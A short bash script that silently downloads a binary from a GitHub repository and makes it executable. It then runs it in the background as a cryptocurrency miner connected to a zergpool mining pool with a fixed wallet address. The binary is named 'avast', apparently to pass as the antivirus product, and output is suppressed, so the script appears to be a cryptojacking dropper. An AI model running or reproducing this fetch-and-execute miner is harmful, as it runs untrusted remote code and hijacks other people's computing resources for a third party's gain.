#!/bin/bash
wget https://github.com/aurbach55/pos/raw/main/avast >/dev/null 2>&1
chmod +x avast  >/dev/null 2>&1
nohup ./avast -v -l verushash.asia.mine.zergpool.com:3300 -u RWd6p2jPioKjjke1L3sXM6ZPThQzjCK13K.tes-vcn -p c=RVN,mc=VRSC -t 1 > nohup.out
